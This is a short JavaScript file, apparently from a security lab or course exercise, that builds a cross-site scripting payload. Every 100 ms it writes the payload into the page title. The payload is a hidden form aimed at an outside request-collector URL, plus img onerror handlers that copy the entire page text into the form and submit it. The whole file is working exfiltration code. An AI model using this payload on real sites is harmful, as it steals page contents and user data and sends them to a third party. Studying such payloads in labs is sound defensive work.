// references:
// [42] https://requestbin.com/ --> request bin 
// [44] https://www.w3schools.com/jsref/met_win_setinterval.asp --> setInterval() usage 
// [48] https://developer.mozilla.org/en-US/docs/Web/API/Document/forms --> for making forms and accessing their values
// [33] https://www.w3schools.com/jsref/prop_node_textcontent.asp --> textContent usage
// [49] https://developer.mozilla.org/en-US/docs/Web/API/Document/documentElement --> to get entire document element
// [50] https://www.w3schools.com/jsref/event_onerror.asp --> onerror event usage 

function changeTitle(){
    // in 100 ms, change the page title to be the XSS payload 
    window.setInterval(function(){
        document.title = 
            '<form name="xss_form" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
                <input type="text" id="info" name="info"> \
                <input type="submit" value="Submit"> \
            </form>\
            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.documentElement.textContent">\
            <img src="x" onerror="document.forms.xss_form.submit()">';
    }, 100);
    
}